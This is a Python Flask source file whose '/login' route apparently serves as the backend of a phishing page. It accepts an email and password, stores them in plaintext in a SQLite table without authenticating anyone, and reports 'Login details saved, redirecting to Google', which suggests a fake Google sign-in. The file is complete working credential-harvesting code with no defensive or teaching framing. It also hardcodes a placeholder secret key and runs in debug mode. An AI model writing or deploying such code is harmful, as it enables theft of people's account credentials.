from flask import Flask, request, jsonify
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField
from wtforms.validators import DataRequired
import sqlite3
from flask_wtf.csrf import CSRFProtect, generate_csrf

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'  # Replace with a secure key in production
csrf = CSRFProtect(app)

# Define a form for CSRF protection and validation
class LoginForm(FlaskForm):
    email = StringField('email', validators=[DataRequired()])
    passw = PasswordField('pass', validators=[DataRequired()])  # Renamed to avoid reserved word

# Initialize SQLite database
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (email TEXT NOT NULL, password TEXT NOT NULL)''')
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route('/get_csrf_token')
def get_csrf_token():
    return jsonify({'csrf_token': generate_csrf()})

@app.route('/login', methods=['POST'])
def login():
    form = LoginForm()
    if form.validate_on_submit():
        email = form.email.data
        password = form.passw.data

        # Save to database
        try:
            conn = sqlite3.connect('users.db')
            c = conn.cursor()
            c.execute("INSERT INTO users (email, password) VALUES (?, ?)", (email, password))
            conn.commit()
            conn.close()
            return jsonify({'success': True, 'message': 'Login details saved, redirecting to Google'})
        except sqlite3.Error as e:
            return jsonify({'success': False, 'message': f'Database error: {str(e)}'}), 500
    else:
        print(form.errors)  # Log validation errors for debugging
        return jsonify({'success': False, 'message': 'Invalid input', 'errors': form.errors}), 400

if __name__ == '__main__':
    app.run(debug=True)